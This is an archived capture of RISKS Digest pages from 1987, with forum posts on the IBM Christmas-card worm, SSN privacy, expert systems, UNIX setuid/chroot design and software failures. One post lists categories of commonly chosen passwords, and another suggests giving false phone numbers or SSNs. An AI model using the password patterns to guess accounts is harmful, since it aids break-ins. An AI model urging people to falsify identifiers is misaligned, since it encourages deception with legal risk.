<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 83</H1>
<H2> Thursday, 24 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Another article on the Christmas Virus 
</A>
<DD>
<A HREF="#subj1.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Social Insecurity 
</A>
<DD>
<A HREF="#subj2.1">
Willis H. Ware
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Expert systems 
</A>
<DD>
<A HREF="#subj3.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Most-common passwords 
</A>
<DD>
<A HREF="#subj4.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Permissions and setuid on UNIX 
</A>
<DD>
<A HREF="#subj5.1">
Philip Kos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  UNIX chroot and setuid 
</A>
<DD>
<A HREF="#subj6.1">
Michael S. Fischbein
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Another article on the Christmas Virus [just in time for Xmas]
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Wed, 23 Dec 87 18:28:31 EST
</i><PRE>

    [In the spirit of the season, I am including this now rather old-hat
    and somewhat ill-informed note for a few more background details.  It 
    is interesting perhaps more for what the press can do to an incident
    than for the incident itself.  Happy holidays to all.  RISKS will take
    some vacation -- unless something really startling happens.  PGN]

I have been handed a clipping from the (Toronto) Globe and Mail's "Report
on Business" section.  I don't have the date, but Texaco Canada Inc. closed
at $31, up $4.50, on the other side of the page.

The clipping is of the Quidnunc column by Bud Jorgenson.
My !'s in square brackets.

  Merry Christmas, Big Blue.  The internal system of the world's
  biggest computer company was disrupted for almost 72 hours by an
  electronic Christmas card.  IBM's public relations department
  played down the seriousness of the incident, but according to
  our mole at IBM, "it crippled us".
  
  The computer equivalent of a nuclear meltdown [!] began at a
  university in West Germany when someone tapped into [!] IBM's
  Prof (PRofessional OFfice) System with a graphics-laden
  Christmas message.  Whether it was deliberate or a coding error
  was not clear [!], but the card quickly became a hit and was passed
  on to various routing systems.
  
  As every computer buff knows, graphics use large bites of memory
  and this one gobbled up an ever expanding chunk of the Prof
  System as it multiplied its way through IBM offices.  This was
  a week ago Friday, just before quitting time in Europe and
  during the first half of the workday on this side of the water.
  
  When the system goes down, IBM simply cannot work because just
  about everything is dependent on the [!] computer, right down
  to daily diaries with meeting schedules.  By early Monday,
  the system in Canada was partly restored so that employees
  could tap into the data base to read files.
  
  But they couldn't use printers or communicate with other offices
  until the all-clear was sounded, which was after 10 am Eastern
  time.  An IBM spokesman said the impact on operations varied
  from country to country.
  
  Police work to track down the culprit was turned over to Bitnet
  and Earn, a pair of computer networks that link universities in
  North America and Europe.  The list of suspects has been
  narrowed to two at the Technical University of Clausthal,
  a small town south of Hanover.

Forwarded by Mark Brader, SoftQuad Inc., Toronto, utzoo!sq!msb

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Social Insecurity (Re: <A HREF="/Risks/5.82.html">RISKS-5.82</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 24 Dec 87 09:12:05 PST
From: willis@rand-unix.ARPA

Let's talk about the SSN some more, even tho it's been done a lot.
Originally the SSN was the number that identified one's account with the
SSA; hence, it was like a bank account number.  As we all know, the cards
and literature from the SSA all specificically say:  Not an identification
number.  In fact it was called the SSAN.

As the SSN spread throughout society, someone along the way observed that
it could play the role of a personal identifier.  I do not recall, may
not even ever have known, the first such occurrence.

The best definitive treatment of the SSN and its role in society is
chapter 16 of the report of the Privacy Protection Study Commission:
Personal Privacy in an Information Society, July 1977, USGPO.  I wrote the
original drafts of the chapter, and at the time, it was factually complete
and accurate.  It is of course now 10 years old.

Generally speaking, there are only a few situations in which one is
obligated by law to give his SSN.  Aside from the SSA business, it generally
revolves around tax reporting and secondary aspects of same.  Thus,
financial transactions require the SSN but it's still really a tax matter
because the IRS wants to track financial matters in its own interests.

At least one state has required by law that the SSN be the driver license
number and it was upheld in court; I think it was Virginia.  Another state
tried but was shot down in court; it may have been Illinois.  UCLA tried to
use it as a student ID but backed off when threatened by a student in a
court case.

The point is that most organizations that ask for it do not have a legal
basis for requesting it.  Rather, it's more like a condition of doing
business with the organization.  In that respect, it's like one's phone
number or driver license, one or both of which are commonly asked for in
California when making a bankcard purchase.  On occasion, I have
challenged such requests, usually successfully, but it's always a hassle
because the clerks are only doing as told.  The phone number is easy; give
any one that comes to mind.  That one has never backfired on me; I
and a lot of other people give a business phone.  After all why
asdvertise a residential number that you pay to keep unlisted?

I have corresponded with MasterCard about this, but it can do nothing to
control the merchants.  They do not require it of the merchants, and it's
not clear to me why the merchant's even want the supplementary data.  I
suppose they believe that the driver license number may lead to a good
current address and that a phone number may be useful in a collection
action.  I frankly feel uneasy about a phone number, a DL number, and a
bankcard number on one piece of paper being handled by people who are not
trained or accustomed to dealing with sensitive personal information.  The
combination of numbers makes it all that much easier to masquerade.

Organizations try circuitous ways to get the SSN.  For example, when one
gets or renews a driver license in California, he finds a place for
inserting the SSN but without explanation.  The sheep among the population
of course fill it in without asking although there is no statement on the
form saying that it is required.  The presence of the blank space for the
SSN implies that it is a required data item.  If one asks about it though
(and clearly I have) he's told that "it's optional".  How about that as a
way to finesse people and get data that the state has no legal basis for
requesting?  It's clear why they want it; it makes it easier to correlate
DMV data with that from insurance companies.

Anyway, the best you can do is to ask anyone:  Under what legal authority
do you request my SSN?  If there's no answer or a poor answer, then you're
in the confrontation business -- which maybe you can win by escalating it
up the line to the top of the organization.  It's not unheard of for the
administrative or ADP types to make a policy decision to use the SSN
without the concurrence or knowledge of the top management.  My usual
line of argument is: "You have no legal basis for requesting my SSN and
you have no need for it."

If there is no legal basis for requesting it, your choices are:

	1. Do business with another company, or at least, threaten to.

	2. Continue to confront and ignore the requests as long as you
	can.  Sometimes ignoring the request will make it go away.

	3. Give an incorrect SSN number to satisfy the request, but
	realize that in doing so, there could always be a backlash if
	there happens to be a legitimate use for it.  This amounts
	to seeding the recordkeeping system with noisy data.

I think it's rather clear what's going on.  The company you deal with has
adopted the SSN as a convenient personal identifier.  You might be able to
force it to issue its own identifier.  Sometimes an insurance company will
contract with some outsider for record keeping support so the decision may
have originated elsewhere.

In the end, it's a Catch-22 situation.  nne doesn't always have
competition to give him alternate choices, or he may prefer the company
that's bugging him.  All any of us can do is drag our feet, refuse as often
as possible, and bring pressure wherever possible.  At the same time we
need to know when we're legally obligated to give the SSN and what the
penalty is for not doing so.

That'a quick once-over lightly.

One individual at Los Alamos contested a request for his SSN and as I
recall, with success.  I don't wish to intrude on his privacy by
publishing his name/contact publicly.  If you're interested in his case,
I'll pass along names/addresses to him.
					Willis H. Ware, Rand Corporation

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Expert systems (<A HREF="/Risks/5.78.html">RISKS-5.78</A>)
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:nuchat!sugar!peter@uunet.UU.NET ">
nuchat!sugar!peter@uunet.UU.NET 
</A>&gt;
</address>
<i>
24 Dec 87 01:00:54 GMT
</i><PRE>

Re: the folowing comment on the use of expert systems in environments where
the system's decision making process can't be examined...

  For example, a pilot flying an aircraft through a fly-by-wire
  system can't examine all the control logic while flying the
  airplane.  We can (and should) strive to give as much pertinent ...

Perhaps we should avoid using poorly understood systems in real-time
applications. It's debatable whether expert systems would actually buy you
any efficiency in this case, but even ceding this point efficiency is not
the only criterion in the design of control systems. Repeatability is at
least as important.

-- Peter da Silva  `-_-'  ...!hoptoad!academ!uhnix1!sugar!peter
-- Disclaimer: These U aren't mere opinions... these are *values*.

    [Between Peter G. N. and Peter da S., this topic has been a real Repeter.  
    But these sentiments are clearly a concern of the RISKS Forum.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Most-common passwords (<A HREF="/Risks/5.82.html">RISKS-5.82</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
24 Dec 87 12:15:00 PST (Thursday)
</i><PRE>
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;
To: RISKS@csl.sri.com

In Security Interest Group Digest of 12 Nov 86, Bob Baldwin
&lt;baldwin@xx.lcs.mit.edu&gt; posted a list of likely passwords arranged by
category.  Though it doesn't say so, I believe the list is from college
student accounts.  The common categories were:
 
   Obscene words
   Favorite music (group names, albums)
   Ego strokes (lord, wizard, ...)
   Cartoon names and places
   Car names
   Insults to computer (farce, slave, ...)
   Female names
   Male names
   Funny words (whynot, foobar, simple, ...)
   Spy terms (secret, password, ...)
   Keyboard sequences (qweasd, poiqwe, ...)
   Tolkien characters and places
   Popular fiction and sci fi (characters, titles) esp. serials
   Doubled 3 letter groups (sexsex, foofoo, ... esp. user names doubled).
   Pet names (bowser, ...)
   Reversals (terces, drawkcab, ...)
   Composers
   Passwords for dead accounts (deadacct, unused, ...)
   Passwords based on host name for people with lots of passwords
     (e.g., for a system is named "cls": clspass, clspwd, ...)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Permissions and setuid on UNIX (Re: RISKS digest 5.57)
</A>
</H3>
<address>
Philip Kos
&lt;<A HREF="mailto:decvax!osiris!phil@ucbvax.Berkeley.EDU ">
decvax!osiris!phil@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Fri, 20 Nov 87 11:58:41 EST
</i><PRE>

I thought a reply to David's exhaustive explanation of the "correct" use
of UNIX setuid to allow copying otherwise unreadable info (RISKS 5.57)
was warranted.  His description of setting up special groups to make the
student's file readable by the setuid-teacher process is interesting, but
as unnecessary as it is (admittedly) ungainly.

&gt; From: oster%dewey.soe.Berkeley.EDU@Berkeley.EDU (David Phillip Oster)
&gt; Subject: UNIX setuid stupidity
&gt; Date: 6 Nov 87 20:08:36 GMT
&gt; ... [the task] would copy a file owned by a student into a directory
&gt; owned by a teacher. ...

The method David described will certainly work but is unnecessarily
complicated.  What is really needed is for the copy process to use its
effective uid (teacher) to open the target file, and then use its real
uid (student) to read the source file.

open() uses the effective uid (not the real uid) which makes it possible
to open the teacher's file, but not to open the students's file.  However,
the proper permission is needed only for the open(), and not for any
read()s or write()s.  This makes it possible to create the teacher's file
*and* open the student's file for reading within the same process, by
fiddling with the process' effective uid.

(Aside: I recently debugged a problem with another local setuid process
which was using the access() system call to determine whether or not a
data file should be written.  I have to wonder about the usefulness of
access(), which uses the process' real uid to check permissions, when the
real uid is virtually useless because of open()'s use of the (different)
effective uid for the same purpose.)

The scheme is to open() the teacher's file, then set effective uid to
real uid, then open() the student's file and perform the copy.  The
basic copying procedure thus becomes more complicated, but any global
mucking around with the system (like dynamically creating and removing a
unique group id, or statically assigning unique group ids for each
(teacher, student) pair at the beginning of a school term) is avoided.

A simple implementation using /bin/cat to do the actual copying follows.
This code works on a Pyramid running OSx version 4.0 (OSx is a "dual port"
4.2BSD and SysV.2 UNIces); it should work on any "real" UNIX system, using
either setuid(getuid()) (as shown) or the appropriate combination of
getreuid() and setreuid().  Extension to handle multiple files should be
simple enough if it is necessary.

...!decvax!decuac!\                                              Phil Kos
  ...!uunet!mimsy!aplcen!osiris!phil           The Johns Hopkins Hospital
...!allegra!/                                               Baltimore, MD

   [PLEASE CONTACT PHILIP DIRECTLY IF YOU WISH THE PROGRAM...  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
UNIX chroot and setuid (Re: <A HREF="/Risks/5.71.html">RISKS-5.71</A>)
</A>
</H3>
<address>
Michael S. Fischbein 
&lt;<A HREF="mailto:msf@ames-nas.arpa">
msf@ames-nas.arpa
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 05:50:37 PST
</i><PRE>
Organization: NASA Langley Research Center, Hampton, VA

I must disagree with the conclusions drawn by the comment in RISKS 5.71
that chroot() will not prevent a setuid program from accessing the rest
of the system.  The scenario described will allow such access BUT proper
design of a setuid() program designed for security will prevent this.

The foundation of any classified data system is the `need to know.'
Analogously, the foundation of a security conscious computer program must be
that only sufficient permissions to do the required task are granted.  If you
only need to read the data in a file, you do not get write permission.  For
setuid()/chroot() programs, the user whose ID is being set to should NOT EVER
be root.  ROOT SETUID SHOULD ONLY BE USED IF ACTUAL ROOT PERMISSIONS ARE
REQUIRED.  If you are setting up a chroot() section of the tree, all required
permissions could easily be satisfied by having a dummy user number to own all
the system files, directories, etc in that section of the tree.  Full
protection could involve rewriting the system calls for open() to not allow
root type access to programs linked with the system library in the restricted
part of the tree.  This step is not necessary; setuid() is a powerful tool
that is easily toned down to the appropriate level by selecting an appropriate
user id to set to.  Don't use root unless it is necessary.

In fact, the setuid() call itself is overused.  Most programs that require the
sort of permissions revisions that setuid() permits can get by with setgid().

		mike
Michael Fischbein  msf@prandtl.nas.nasa.gov ...!seismo!decuac!csmunix!icase!msf
These are my opinions and not necessarily official views of any organization.

   [These last two messages have been backlogged for a while.  I think they are
   of interest.  However, it is important to note that there are many other
   vulnerabilities as well, and attempts to patch around or use carefully a 
   particular vulnerability does not imply the absence of other problems.
   So please temper any future contributions accordingly.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.82.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.84.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-36</DOCNO>
<DOCOLDNO>IA012-000130-B023-105</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.02.html 128.240.150.127 19970217014831 text/html 14118
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:47:00 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 2</TITLE>
<LINK REL="Prev" HREF="/Risks/5.01.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.03.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 2</H1>
<H2> Friday, 12 June 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Three gremlins on the loose: nukes, sharks, enlightened rockets 
</A>
<DD>
<A HREF="#subj1.1">
Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Yet another air-traffic-controller foul-up 
</A>
<DD>
<A HREF="#subj2.1">
Roy Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  National Crime Information Center access 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Yes, Virginia, There Are Software Problems 
</A>
<DD>
<A HREF="#subj4.1">
Nick Condyles
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Heisenbugs; Also, Risks of Supercomputers 
</A>
<DD>
<A HREF="#subj5.1">
Eugene Miya
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Three gremlins on the loose: nukes, sharks, enlightened rockets
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:dplatt@teknowledge-vaxc.ARPA ">
dplatt@teknowledge-vaxc.ARPA 
</A>&gt;
</address>
<i>
Thu, 11 Jun 87 08:08:13 pdt
</i><PRE>

  [Whereas the following three incidents are not directly computer related,
  they are clearly RISKS related, providing further examples of the unexpected
  technical failures.  On examining my list of collected cases, I am astounded
  to discover how many of the cases were due to causes that (a) had never
  occurred before and (b) no one had even anticipated might occur.  PGN]

This morning's San Jose Mercury News contains three interesting
articles, almost one-after-another.  Their headlines, and a summary of
their contents:

* "Official says many U.S. atom bombs are faulty"

   More than one of every three nuclear weapons in the U.S. arsenal
doesn't work properly, [Sylvester Foley, asst. sec. of energy for
defense programs] said yesterday [during a breakfast meeting with
reporters].

   "Hypothetically, it could be catastrophic if you ever wanted to use
it and you pushed the button and nothing happened", said Foley.

                  { no comment... dcp }

 * "Jaws V: Sharks make light lunch of trans-Atlantic fiber-optic cables"

   Sharks seem to have taken a fancy for the new 1"-thick underwater
cables being strung across the Atlantic;  they've bitten through the
cable at least four times (cost-to-repair $250,000 per bite).  Similar
bitings have been reported in the Pacific.  Older-style copper-wire
cables apparently weren't attractive to sharks, and weren't bitten.

   [The NYTimes article suggests that the sharks seem to be attracted to the
   low electrical currents in the copper wires providing power for the
   fiberoptic repeaters.  The new cables are still shielded, but much thinner
   than previously.  PGN]

* "Lightning hits NASA launch pad inadvertently setting off 3 rockets"

   A lightning strike on a pad at NASA's launch facility at Wallops
Island, VA. ignited three small rockets and sent two of them hurtling
along their planned trajectories;  they were more than two miles out
before the NASA officials could prepare to track them.  The third
rocket wasn't in firing position, and splashed down in the ocean 300
feet from the pad.  It appears that a lightning bolt may have induced
a current pulse in the firing leads, triggering the igniters.

   One of the rockets was scheduled to have been launched shortly
thereafter to study night-time thunderstorms and their effect on the
atmosphere.

    [The weather-satellite ground station was also affected, despite
    surge suppressors and grounding wires that were supposed to protect
    it.  Weather data from GOES-West could not be received for 9 hours,
    and GOES-East was blacked out for 5.5 hours.  NYTimes, same day.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Yet another air-traffic-controller foul-up
</A>
</H3>
<address>
Roy Smith
&lt;<A HREF="mailto:cmcl2!phri!roy@seismo.CSS.GOV ">
cmcl2!phri!roy@seismo.CSS.GOV 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 9 Jun 87 20:24:16 GMT

	From the NY Times, June 9, 1987, page A22:  "Coding Error at O'Hare
Brings Two Jets Much Too Close Together".  Comments/elipsis in [brackets]
are my summations or deletions from the original.

  	"Two American Airlines jets were guided past each other at a
  fraction of the minimum legal distance of separation between them because
  of an error by an air traffic assistant, the National Transportation Safety
  Board said yesterday.  [This happened late last month.]
  
  	"But Mr. Engen [chief of the F.A.A.] said he did not believe that
  the incident justified any permanent reduction of, or special restraints
  on, Chicago area traffic.  He said the F.A.A. had determined that existing
  procedures, "when properly applied, do maintain a safe level of operation
  in the Chicago area."  [...]
  
  	"According to officials of the safety board and the F.A.A., here is
  what happened:
  
  	"An air traffic assistant in the tower at Chicago's O'Hare
  Internation Airport assigned the wrong code to the crew of a United
  Airlines plane that was about to take off.  The code was the one for an
  American Airlines plane that took off three minutes later.
  
  	"Result: Confusion
  
  	"The result was that the full-fledged controller whose job it was
  to radio subsequent air traffic instructions to the two planes saw the
  United plane on his radar scope with the American plane's identification,
  altitude and other data.  The computer feeding this data to the radar scope
  rejected duplicate data for the American plane, rightly concluding that two
  planes could not have the same code.  The American plan showed up only as a
  bright radar blip, without any identification alongside.
  
  	"Now, the controller wanted the United plane, with the American
  plane's data next to it, to climb to a new altitude.  When he radioed
  instructions to "American 637" to climb, the United crew ignored them, and
  the instruction were carried out by the real American 637.  [This caused
  American 637 to pass another American plane at 1/4 mile horizonal and 500
  feet vertical separation -- the rules call for 3 miles and 1000 feet.]
  
  	"[The quick fix is to add more supervisory staff to the O'Hare
  tower.]
  
  
	The biggest question in my mind is why does the system just drop
one plane if it sees two with the same id?  Shouldn't bells ring and lights
flash when an obvious operator-error situation like this pops up?  Also,
why isn't the plane id part of the info sent by the on-board transponder?
Aren't these id's simply the flight numbers assigned by the airlines?  Why
should it require any manual intervention to assign an id to a blip?

Roy Smith, {allegra,cmcl2,philabs}!phri!roy
System Administrator, Public Health Research Institute
455 First Avenue, New York, NY 10016

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
National Crime Information Center access
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@CSL.SRI.COM">
Neumann@CSL.SRI.COM
</A>&gt;
</address>
<i>
Fri 12 Jun 87 07:27:29-PDT
</i><PRE>
To: RISKS@CSL.SRI.COM

Also in the NYTimes on the same day as the bombs, the sharks, and the
enlightning rockets was a front-page item on a proposed expansion of the
NCIC database that would permit Federal, state, and local law-enforcement
agencies to exchange information on people who are suspected of a crime but
have not been charged.  A government advisory panel also recommended that
the NCIC should have access to other databases such as those of the
Securities and Exchange Commission, the Internal Revenue Service, the
Immigration and Naturalization Service, Social Security, and State
Department passport office.  Attempts to legislate controls were also noted
in the Times article, although concerns for protection of privacy seemed
not to be commensurate with inadequacies in the technology and practice of
protecting systems and networks from internal and external misuse.  PGN

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Yes, Virginia, There Are Software Problems
</A>
</H3>
<address>
Nick Condyles
&lt;<A HREF="mailto:condyles@talos.UUCP ">
condyles@talos.UUCP 
</A>&gt;
</address>
<i>
8 Jun 87 20:46:10 GMT
</i><PRE>
Organization: Philip Morris Research Center, Richmond, VA

The following appeared in the Richmond Times-Dispatch June 8, 1987
Section B page 1.  The article pertains to the state of Virginia's
attempt to automate distribution of child support payments.


                 STATE PAYMENTS FOR SOFTWARE SYSTEM HALTED

	State officials have halted payments on a problem-plagued computer
software system used in distributing child support checks and say the
manufacturer will get no more money until the system works.

	The state secretary of human resources, Eva S. Teig, said Saturday that
the state has paid Unisys Inc. only $75,000 of the $395,000 total "because
we are not satisfied with the product.  Until we are satisfied, we will not
continue payments on the program."

	Ms. Teig's announcement came as she prepared to submit a confidential
report on the child-support automation problems to Gov. Gerald L. Baliles.
The report "is a look at what has happened and a recommendation on where I
think we should be going," she said.

	The software system has been blamed for massive snarls in the
distribution of child support checks.

	If state officials are unable to work out the problems, Ms. Teig said,
"we'll look at other alternatives.  We're committed to making it work."

	Del. Howard E. Copeland, D-Norfolk, last month asked Attorney General
Mary Sue Terry to investigate the state Department of Social Services'
purchase of the software and determine whether it has been acquired through
legal procedures.

	Bert Rohrer, a spokesman for the attorney general, refused to comment
on whether an inquiry is being conducted.

	The purchase of the software was part of the department's attempt to
take over collection of child support payments, a job that had been done by
the courts.  The centralization brought widespread complaints about lost
checks, delayed payments and improper seizure of tax refunds.

	Social Services Commissioner William L. Lukhard approved the purchase
of the software system from Unisys, formerly Sperry Corp., in May 1985.
Critics say the software never worked properly, causing further delays in
the already slow distribution of checks.

	A federal audit last month said operating the new computer system would
cost Virginia up to $7 million per year, more than three times the amount
originally anticipated.

	Representatives of Unisys and state computer experts are analyzing the
system to determine if it can be corrected and "some progress has been
made," Ms. Teig said.

	The state is prepared to take further action if the software cannot be
salvaged, Ms. Teig said.  She would not elaborate.

Several state legislators have suggested that Lukhard be replaced as social
services commissioner.

	"As I've said before, I think the best thing for the whole department
is someone who would come in with a new broom and sweep clean," said Del.
Frank D. Hargrove, R-Hanover.  "The buck stops at the boss's desk."

	Others defended the agency chief.  "I would be disappointed and upset
if he was driven out of office," said Sen. Joseph V. Gartlan Jr., D-Fairfax.
"I regard him as one of the best administrators in state government."


		Nick Condyles

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-37</DOCNO>
<DOCOLDNO>IA012-000130-B023-134</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7/index.html 128.240.150.127 19970217014850 text/html 85232
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:47:11 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Index to Volume 7</TITLE>
<LINK REL="Pref" HREF="/Risks/6/index.html">
<LINK REL="Next" HREF="/Risks/8/index.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6/index.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8/index.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Index to Volume 7</H1>
<H2>  Thursday 22 December 1988 </H2>
<H3>Forum on Risks to the Public in Computers and Related Systems</H3>
<I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------">
<DL>
